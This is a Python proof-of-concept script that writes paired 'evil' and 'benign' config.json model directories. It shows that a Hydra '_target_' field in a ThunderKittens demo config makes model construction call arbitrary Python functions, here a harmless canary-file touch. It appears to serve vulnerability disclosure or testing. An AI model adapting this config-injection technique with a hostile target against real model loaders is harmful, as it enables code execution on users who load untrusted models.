#!/usr/bin/env python3
"""Generate the positive and negative model directories for the
ThunderKittens demos/based Hydra-dispatch PoC (repo cb21f34).

Both arms share the same outer target (builtins.dict) and the same nested
pathlib.Path parameter; the ONLY differing leaf field is
mixer.payload._target_:

  evil_model   -> pathlib.Path.touch   (creates the canary file: side effect)
  benign_model -> pathlib.Path.exists  (pure check: no side effect)

The samples are config.json-only: no Python, native or executable sidecar.
Weights are irrelevant - the dispatch fires during model construction,
before any weight file is read.
"""
import hashlib
import json
import os

CANARY_NAME = "tk_hydra_canary.txt"

# ordinary, tiny GPT-2 fields so construction reaches the mixer dispatch fast;
# every field is identical across the two arms
CONFIG_COMMON = {
    "architectures": ["GPT2LMHeadModel"],
    "model_type": "gpt2",
    "vocab_size": 100,
    "n_positions": 64,
    "n_ctx": 64,
    "n_embd": 64,
    "n_head": 4,
    "n_layer": 1,
    "bos_token_id": 0,
    "eos_token_id": 0,
}


def build_config(leaf_target):
    cfg = dict(CONFIG_COMMON)
    cfg["mixer"] = {
        "_target_": "builtins.dict",
        "payload": {
            "_target_": leaf_target,
            "self": {
                "_target_": "pathlib.Path",
                "_args_": [CANARY_NAME],
            },
        },
    }
    return cfg


def write_model_dir(name, leaf_target):
    os.makedirs(name, exist_ok=True)
    path = os.path.join(name, "config.json")
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(build_config(leaf_target), fh, indent=2)
    return path


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    evil = write_model_dir("evil_model", "pathlib.Path.touch")
    benign = write_model_dir("benign_model", "pathlib.Path.exists")
    print(f"wrote {evil}")
    print(f"wrote {benign}")
    print(f"evil_model/config.json   sha256={sha256_of(evil)}")
    print(f"benign_model/config.json sha256={sha256_of(benign)}")
    print(f"canary file name used by the payload: {CANARY_NAME}")


if __name__ == "__main__":
    main()
